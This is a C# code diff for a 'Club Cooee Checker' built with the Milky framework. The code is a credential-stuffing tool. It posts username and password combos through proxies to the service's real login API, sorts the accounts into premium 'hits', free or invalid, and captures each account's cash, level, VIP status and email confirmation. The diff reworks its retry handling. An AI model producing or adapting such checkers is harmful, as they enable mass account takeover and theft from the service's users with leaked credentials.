@@ -37,50 +37,47 @@ namespace Milky.Examples
                 })
                 .WithCheckingProcess(async (combo, proxy) =>
                 {
-                    var result = CheckResult.Unknown;
-                    Dictionary<string, string> captures = null;
-
-                    while (result == CheckResult.Unknown)
+                    try
                     {
-                        try
+                        using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
                         {
-                            using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
+                            Content = new FormUrlEncodedContent(new Dictionary<string, string>
                             {
-                                Content = new FormUrlEncodedContent(new Dictionary<string, string>
-                                {
-                                    { "username", combo.Username },
-                                    { "password", combo.Password }
-                                })
+                                { "username", combo.Username },
+                                { "password", combo.Password }
+                            })
+                        };
+
+                        using var responseMessage = await _httpClient.SendAsync(requestMessage);
+
+                        var contentString = await responseMessage.Content.ReadAsStringAsync();
+                        var contentJson = JsonConvert.DeserializeObject<dynamic>(contentString);
+
+                        if (!(bool)contentJson.error)
+                        {
+                            dynamic user = contentJson.msg.userdata.auth;
+
+                            var result = (bool)user.premium ? CheckResult.Hit : CheckResult.Free;
+
+                            var captures = new Dictionary<string, string>
+                            {
+                                { "Cash", (string)user.credits },
+                                { "Level", ((int)user.xp_level).ToString() },
+                                { "VIP", ((bool)user.premium).ToString() },
+                                { "Email confirmed", ((bool)user.email_confirmed).ToString() }
                             };
 
-                            using var responseMessage = await _httpClient.SendAsync(requestMessage);
-
-                            var contentString = await responseMessage.Content.ReadAsStringAsync();
-                            var contentJson = JsonConvert.DeserializeObject<dynamic>(contentString);
-
-                            if (!(bool)contentJson.error)
-                            {
-                                dynamic user = contentJson.msg.userdata.auth;
-
-                                captures = new Dictionary<string, string>
-                                {
-                                    { "Cash", (string)user.credits },
-                                    { "Level", ((int)user.xp_level).ToString() },
-                                    { "VIP", ((bool)user.premium).ToString() },
-                                    { "Email confirmed", ((bool)user.email_confirmed).ToString() }
-                                };
-
-                                result = (bool)user.premium ? CheckResult.Hit : CheckResult.Free;
-                            }
-                            else
-                            {
-                                result = CheckResult.Invalid;
-                            }
+                            return (result, captures, false);
                         }
-                        catch { }
+                        else
+                        {
+                            return (CheckResult.Invalid, null, false);
+                        }
                     }
-
-                    return (result, captures);
+                    catch
+                    {
+                        return (CheckResult.Retry, null, true);
+                    }
                 });
 
             var console = new MilkyConsole()
@@ -88,7 +85,7 @@ namespace Milky.Examples
                 .WithMeta(new Meta
                 {
                     Name = "Club Cooee Checker",
-                    Version = "v1.0.0",
+                    Version = "Example",
                     Author = "Laiteux"
                 })
                 .WithSettings(new ConsoleSettings
